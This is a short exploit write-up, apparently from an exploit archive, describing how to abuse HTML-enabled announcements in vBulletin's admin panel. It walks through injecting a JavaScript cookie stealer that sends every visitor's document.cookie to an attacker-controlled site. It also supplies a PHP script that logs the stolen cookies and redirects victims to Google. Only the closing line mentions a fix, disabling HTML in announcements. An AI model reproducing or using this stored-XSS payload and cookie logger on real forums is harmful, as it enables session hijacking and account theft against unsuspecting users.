title: vBulletin Announcements Cookie Steal Vulnerability
author: neutr0n
cves: 

vBulletin Announcements, by default has html enabled, so if you get access to a forum using other exploits and get a user with acp info, but it only has default admin cp permissions (moderator access and announcements), you can inject a cookie stealer and steal other users informations.

admincp>announcements>create a new one>put some random announcemnt + this code:

<script language="JavaScript">
document.location= " http://www.yoursite.com/cookie.php?p=" + document.cookie; </script>

and in your site put this and name it cookie.php

<?php
$cookie = $HTTP_GET_VARS[" p"]; 
$file = fopen('cookielog.txt', 'a'); 
fwrite($file, $cookie . "\n\n"); 
echo " <script>location.href='http://www.google.com';</script>";
?>


If you're the owner, a "fix" for this is disallow html in announcements.
